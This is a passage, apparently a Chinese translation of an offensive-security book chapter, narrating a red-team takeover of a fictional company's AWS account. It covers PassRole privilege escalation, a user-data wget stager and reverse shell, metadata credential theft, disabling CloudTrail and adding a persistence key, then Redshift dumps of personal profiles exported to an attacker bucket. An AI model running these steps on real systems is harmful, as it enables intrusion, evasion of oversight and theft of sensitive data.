root@Point1:~/# aws redshift describe-clusters \
**--profile=data1 \**
**--region eu-west-1**

An error occurred (AccessDenied) when calling the DescribeClusters...
```

看来是时候进行一些权限提升了。

### 权限提升

通过检查我们获得的十二个 IAM 访问密钥，我们意识到它们都属于同一个 IAM 组，因此共享相同的基本权限——也就是，读取/写入一些桶，并附带一些轻量的只读 IAM 权限：

```
root@Point1:~/# aws iam list-groups --profile=leslie
"GroupName": "spark-s3",

root@Point1:~/# aws iam list-groups --profile=marc
"GroupName": "spark-s3",

root@Point1:~/# aws iam list-groups --profile=camellia
"GroupName": "spark-debug",
"GroupName": "spark-s3",

`--snip--`
```

等一下。Camellia 属于一个名为 *spark-debug* 的附加组。让我们仔细看看这个组所附加的策略：

```
root@Point1:~/# aws iam list-attach-group-policies --group-name spark-debug --profile=camellia

"PolicyName": "AmazonEC2FullAccess",
"PolicyName": "iam-pass-role-spark",
```

太好了。Camellia 在这里可能是负责维护和运行 Spark 集群的人，因此她被授予了这两个策略。EC2 完全访问权限为她打开了 450 多种 EC2 操作的可能性，从启动实例到创建新的 VPC、子网，几乎涵盖了与计算服务相关的所有操作。

第二个策略是定制的，但我们可以轻松猜测它意味着什么：它允许我们将角色分配给 EC2 实例。我们查询最新版本的策略文档来确认我们的猜测：

```
# get policy version
root@Point1:~/# aws iam get-policy \
**--policy-arn arn:aws:iam::983457354409:policy/iam-pass-role \**
**--profile camellia**

"DefaultVersionId": "v1",

# get policy content
root@Point1:~/# aws iam get-policy-version \
**--policy-arn arn:aws:iam::983457354409:policy/iam-pass-role \**
**--version v1 \**
**--profile camellia**

"Action":"iam:PassRole",
1 "Resource": "*"
`--snip--`
```

GP 可能没有完全意识到，但通过 IAM 的`PassRole`操作，他们已经隐性地赋予亲爱的 Camellia——以及通过她，*我们*——对他们的 AWS 账户完全的控制权。`PassRole`是一个强大的权限，允许我们将角色分配给实例。任何角色 1，甚至是管理员角色。凭借`EC2 完全访问`，Camellia 还可以管理 EC2 实例，启动机器，给它加上管理员角色，然后接管 AWS 账户。

让我们探讨一下作为 Camellia 的我们可以传递给 EC2 实例的角色选项。唯一的限制是该角色需要在其信任策略中包含*ec2.amazonaws.com*：

```
root@Point1:~/# aws iam list-roles --profile camellia \
**| jq -r '.Roles[] | .RoleName + ", " + \**
**.AssumeRolePolicyDocument.Statement[].Principal.Service' \**
**| grep "ec2.amazonaws.com"**
`--snip--`
jenkins-cicd, ec2.amazonaws.com
jenkins-jobs, ec2.amazonaws.com
rundeck, ec2.amazonaws.com
spark-master, ec2.amazonaws.com
```

在这些角色中，我们看到了 rundeck，这可能就是我们期待的救世主。Rundeck 是一个自动化工具，用于在基础设施上运行管理员脚本。GP 的基础设施团队似乎并不热衷于使用 Jenkins，因此他们可能将大部分工作负载调度到了 Rundeck 上。让我们使用 Camellia 来查看 rundeck 拥有哪些权限：

```
root@Point1:~/# aws iam get-attached-role-policies \
**--role-name rundeck \**
**--profile camellia**

"PolicyName": "rundeck-mono-policy",

# get policy version
root@Point1:~/# aws iam get-policy --profile camellia \
**--policy-arn arn:aws:iam::983457354409:policy/rundeck-mono-policy**

"DefaultVersionId": "v13",

# get policy content
root@Point1:~/# aws iam get-policy-version \
**--version v13 \**
**--profile camellia \**
**--policy-arn arn:aws:iam::983457354409:policy/rundeck-mono-policy**

"Action":["ec2:*", "ecr:*", "iam:*", "rds:*", "redshift:*",...]
"Resource": "*"
`--snip--`
```

是的，这就是我们需要的角色。rundeck 角色几乎拥有对 AWS 的完全管理员权限。

因此，计划是在与 Spark 集群相同的子网中启动一个实例。我们小心地复制相同的属性，以便在明面上隐藏：安全组、标签，所有内容。我们正在查找这些属性，以便稍后模仿它们：

```
root@Point1:~/# aws ec2 describe-instances --profile camellia \
**--filters 'Name=tag:Name,Values=*spark*'**

`--snip--`
"Tags":
  Key: Name  Value: spark-master-streaming
"ImageId": "ami-02df9ea15c1778c9c",
"InstanceType": "m5.xlarge",
"SubnetId": "subnet-00580e48",
"SecurityGroups":
  GroupName: spark-master-all, GroupId: sg-06a91d40a5d42fe04
  GroupName: spark-worker-all, GroupId: sg-00de21bc7c864cd25
`--snip--`
```

我们确切知道 Spark 工作节点可以通过 443 端口访问互联网，因此我们懒得重新验证刚刚确认的安全组，直接复制并粘贴这些安全组，并使用 rundeck 配置文件启动一个新实例：

```
root@Point1:~/# aws ec2 run-instances \
**--image-id ami-02df9ea15c1778c9c \**
**--count 1 \**
**--instance-type m3.medium \**
**--iam-instance-profile rundeck \**
**--subnet-id subnet-00580e48 \**
**--security-group-ids sg-06a91d40a5d42fe04 \**
**--tag-specifications 'ResourceType=instance,Tags=**
 **[{Key=Name,Value=spark-worker-5739ecea19a4}]' \**
**--user-data file://my_user_data.sh \**
**--profile camellia \**
**--region eu-west-1**
```

作为用户数据传递的脚本（*my_user_data.sh*）将启动我们的反向 Shell：

```
#!/bin/bash
wget https://gretsch-spark-eu.s3.amazonaws.com/stager
chmod +x ./stager
./stager&
```

我们运行前面的 AWS 命令，果然，过了一两分钟后，我们得到了我们希望的最后一个 Shell，以及管理员权限：

```
[*] https://0.0.0.0:443 handling request from...
[*] https://0.0.0.0:443 handling request from...
msf exploit(multi/handler) > **sessions -i 9**
[*] Starting interaction with 9...
meterpreter > **execute -i -H -f curl -a \**
**http://169.254.169.254/latest/meta-data/iam/security-credentials/rundeck**

"AccessKeyId" : "ASIA44ZRK6WS36YMZOCQ",
"SecretAccessKey" : "rX8OA+2zCNaXqHrl2awNOCyJpIwu2FQroHFyfnGn ",
"Token" : "IQoJb3JpZ2luX2VjEJr//////////wEaCWV1LXdlc3QtMSJ...
```

太棒了！我们得到了属于 rundeck 角色的一堆顶级安全密钥和令牌。现在我们有了这些密钥，让我们查询可能暴露的经典服务，看看哪些是活跃的（CloudTrail、GuardDuty 和 Access Analyzer）：

```
root@Point1:~/# export AWS_PROFILE=rundeck
root@Point1:~/# export AWS_REGION=eu-west-1
root@Point1:~/# aws cloudtrail describe-trails

   "Name": "aggregated",
   "S3BucketName": "gretsch-aggreg-logs",
   "IncludeGlobalServiceEvents": true,
   "IsMultiRegionTrail": true,
   "HomeRegion": "eu-west-1",
 1"HasInsightSelectors": false,

root@Point1:~/# aws guardduty list-detectors
"DetectorIds": []

root@Point1:~/# aws accessanalyzer list-analyzers
"analyzers": []
```

好的，CloudTrail 按预期启用，因此日志可能成为一个问题。没有太大意外。尽管如此，Insights 被禁用了 1，所以如果需要的话，我们可以进行一些批量写入的 API 调用。GuardDuty 和 Access Analyzer 返回空列表，因此它们在这个组合中也缺席。

让我们暂时盲目地隐藏日志轨迹，并向 Camellia 的用户账户中插入一个访问密钥，以增强我们的持久性。如果我们想重新获得对 GP 账户的访问，她的权限完全足够：

```
root@Point1:~/# aws cloudtrail update-trail \
**--name aggregated \**
**--no-include-global-service-events \**
**--no-is-multi-region**

root@Point1:~/# aws iam list-access-keys --user-name camellia

"AccessKeyId": "AKIA44ZRK6WSXNQGVUX7",
"Status": "Active",
"CreateDate": "2019-12-13T18:26:17Z"

root@Point1:~/# aws iam create-access-key --user-name camellia
{
    "AccessKey": {
        "UserName": "camellia",
        "AccessKeyId": "AKIA44ZRK6WSS2RB4CUX",
        "SecretAccessKey": "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",
        "CreateDate": "2019-12-21T18:20:04Z"
    }
}
```

三十分钟后，我们清理了 EC2 实例并重新启用了 CloudTrail 多区域日志记录：

```
root@Point1:~/# aws cloudtrail update-trail \
**--name aggregated \**
**--include-global-service-events \**
**--is-multi-region**
```

终于！我们获得了稳定的管理员访问权限，进入了 GP 的 AWS 账户。

### 渗透 Redshift

现在我们已经获得了 GP 的 AWS 账户访问权限，让我们探索它的 Redshift 集群（见 Listing 12-10）。毕竟，这就是我们接管该账户的主要动机。

```
root@Point1:~/# aws redshift describe-clusters
"Clusters": 
1 ClusterIdentifier: bi,
    NodeType: ra3.16xlarge, NumberOfNodes: 10,
    "DBName": "datalake"
`--snip--`

ClusterIdentifier: sandbox
    NodeType: dc2.large,  NumberOfNodes: 2,
    "DBName": "datalake"
`--snip--`

ClusterIdentifier: reporting
    NodeType: dc2.8xlarge, NumberOfNodes: 16,
    "DBName": "datalake"
`--snip--`

ClusterIdentifier: finance, NodeType: dc2.8xlarge
    NumberOfNodes: 24,
    "DBName": "datalake"
`--snip--`
```

Listing 12-10: 列出 Redshift 集群

我们在 Redshift 上运行了一些集群，里面有有价值的信息。Redshift 是一个不错的选择。你不会仅仅为了随便测试而创建一个支持每个节点 2.5TB 的 ra3.16xlarge 集群 1。这个集群每天的费用肯定超过$3,000，这也让探索它变得更加诱人。金融集群也可能包含一些有趣的数据。

让我们聚焦于[Listing 12-10 中 bi 集群的信息。当集群启动时创建的初始数据库叫做`datalake`。管理员用户是传统的 root 用户。集群可通过地址*bi.cae0svj50m2p.eu-west-1.redshift.amazonaws.com*在 5439 端口访问：

```
Clusters: [
ClusterIdentifier: sandbox-test,
NodeType: ra3.16xlarge,
MasterUsername: root
DBName: datalake,
Endpoint: {
  Address: bi.cdc3ssq81c3x.eu-west-1.redshift.amazonaws.com,
  Port: 5439
}
VpcSecurityGroupId: sg-9f3a64e4, sg-a53f61de, sg-042c4a3f80a7e262c
`--snip--`
```

我们查看安全组，以便检查是否有过滤规则阻止直接连接到数据库：

```
root@Point1:~/# aws ec2 describe-security-groups \
**--group-ids sg-9f3a64e4 sg-a53f61de**

"IpPermissions": [ {
  "ToPort": 5439,
  "IpProtocol": "tcp",
  "IpRanges": [
       { "CidrIp": "52.210.98.176/32" },
       { "CidrIp": "32.29.54.20/32" },
       { "CidrIp": "10.0.0.0/8" },
       { "CidrIp": "0.0.0.0/0" },
```

我最喜欢的 IP 范围：0.0.0.0/0。这种未过滤的 IP 范围可能仅仅是用于测试新的 SaaS 集成或运行一些查询时临时赋予的访问权限……但现在我们已经进入了。公平地说，既然我们已经能够访问 GP 的网络，这对我们来说并不重要。损害已经发生。

Redshift 与 IAM 服务紧密结合，我们不需要去寻找数据库的凭证。由于我们在 rundeck 角色上有一个漂亮的`redshift:*`权限，我们只需为任何数据库用户账户（包括 root）创建一个临时密码：

```
root@Point1:~/# aws get-cluster-credentials \
**--db-user root \**
**--db-name datalake\**
**--cluster-identifier bi \**
**--duration-seconds 3600**

"DbUser": "IAM:root",
"DbPassword": "AskFx8eXi0nlkMLKIxPHkvWfX0FSSeWm5gAheaQYhTCokEe",
"Expiration": "2020-12-29T11:32:25.755Z"
```

使用这些数据库凭证，我们只需下载 PostgreSQL 客户端并将其指向 Redshift 端点：

```
root@Point1:~/# apt install postgresql postgresql-contrib
root@Point1:~/# PGPASSWORD='AskFx8eXi0nlkMLKIx...' \
**psql \**
**-h bi.cdc3ssq81c3x.eu-west-1.redshift.amazonaws.com \**
**-U root \**
**-d datalake \**
**-p 5439**
**-c "SELECT tablename, columnname  FROM PG_TABLE_DEF where schemaname \**
**='public'" > list_tables_columns.txt**
```

我们导出了包含表和列的全面列表（存储在`PG_TABLE_DEF`表中），并迅速锁定了有趣的数据：

```
root@Point1:~/# cat list_tables_columns.txt
profile, id
profile, name
profile, lastname
profile, social_id
`--snip--`
social, id
social, link
social, fb_likes
social, fb_interest
`--snip--`
taxonomy, segment_name
taxonomy, id
taxonomy, reach
taxonomy, provider
`--snip--`
interestgraph, id
interestgraph, influence_axis
interestgraph, action_axis
`--snip--`
```

没有什么比得上一款老式的 SQL 数据库，能让我们随心所欲地查询和连接数据！这个 Redshift 集群几乎是 Gretsch Politico 基础设施中所有数据输入的交汇点。

我们找到了与 MXR 广告的表现以及它对人们在线行为影响相关的数据。我们有他们的完整在线活动，包括他们访问的每个有与 GP 相关的 JavaScript 标签的网站的列表，甚至还有那些天真到愿意与 GP 隐藏合作伙伴共享这些数据的人的社交媒体档案。然后，当然，我们也有从数据提供商那里购买的经典数据分段，以及他们所称的“相似用户群体”——即，A 人群的兴趣投射到 B 人群上，因为他们有一些共同的特征，比如使用的设备、行为等等。

我们尝试构建一个 SQL 查询，将大部分数据汇总到一个输出中，以便更清晰地可视化当前的情况：

```
SELECT p.gp_id, p.name, p.lastname, p.deviceType, p.last_loc,
LISTAGG(a.referer), s.link, LISTAGG(s.fb_interest),
LISTAGG(t.segment_name),
i.action_y, i.influence_x, i.impulse_z

FROM profile p
JOIN ads a on p.ads_id = a.id
JOIN social s on p.social_id= s.id
JOIN taxonomy t on p.segment_id = t.id
JOIN interestgraph i on p.graph_id = i.id
GROUP BY p.gp_id
LIMIT 2000
```

请鼓声雷动，准备好了吗？开始！这是一个客户，弗朗西斯·迪马（Francis Dima）：

```
p.gp_id:     d41d8cd98f00b204e9800998ecf8427e
p.name:       Dima
p.lastname:   Francis
p.deviceType: iphone X
p.last_loc_x: 50.06.16.3.N
p.last_loc_y: 8.41.09.3.E
a.referer:    www.okinawa.com/orderMeal,
              transferwise.com/90537e4b29fb87fec18e451...,
              aljazeera.com/news/hong-kong-protest...
s.link:        https://www.facebook.com/dima.realworld.53301
s.fb_interest: rock, metoo, fight4Freedom, legalizeIt...
t.segment_name:politics_leaned_left,
               politics_manigestation_rally,
               health_medecine_average,
               health_chronical_pain,...
i.influence_x: 60
i.action_y:    95
i.impulse_z:   15

`--snip--`
```

通过聚合几个追踪器，你可以了解到关于人们的许多事情。可怜的迪马（Dima）被绑定到超过 160 个数据段，涵盖从他的政治活动到烹饪习惯和医疗历史的所有信息。我们有他访问过的最后 500 个完整 URL，他最后已知的位置，他的 Facebook 资料，充满了他的兴趣和爱好，最重要的是，一个列出他影响力、冲动和广告互动水平的角色地图。有了这些信息，想想看，GP 要针对这个人——任何人——以影响他们对任何数量的极化话题的看法，**以及**，嗯，向出价最高者出售民主是多么容易。

财务集群是另一个活生生的黄金国。不仅仅是交易数据，它包含了所有可能的每个客户的信息，任何曾对 Gretsch Politico 的服务表现出丝毫兴趣的人，以及他们订购的创意：

```
c.id:        357
c.name:      IFR
c.address:   Ruysdaelkade 51-HS
c.city:      Amsterdam
c.revenue:   549879.13
c.creatives: s3://Gretsch-studio/IFR/9912575fe6a4av.mp4,...
c.contact:   jan.vanurbin@udrc.com
p.funnels:   mxads, instagram, facebook,...
click_rate:  0.013
real_visit:  0.004
`--snip--`

unload ('<HUGE_SQL_QUERY>') to 's3://data-export-profiles/gp/'
```

我们将这两个集群完整地导出到我们拥有的 S3 存储桶，并开始准备我们的下一步行动——新闻发布会、电影，或许是一本书。谁知道呢？

## 资源

+   依赖于 Spark 的公司列表：[`spark.apache.org/powered-by.html`](https://spark.apache.org/powered-by.html)。

+   来自 Apache Spark 文档的 Spark 操作列表：[`bit.ly/3aW64Dh`](http://bit.ly/3aW64Dh)。

+   Redshift 定价详情：[`aws.amazon.com/redshift/pricing/`](https://aws.amazon.com/redshift/pricing/)。

+   关于 `map` 和 `FlatMap` 的更多细节，附带插图：[`data-flair.training/blogs/apache-spark-map-vs-flatmap/`](https://data-flair.training/blogs/apache-spark-map-vs-flatmap/)。
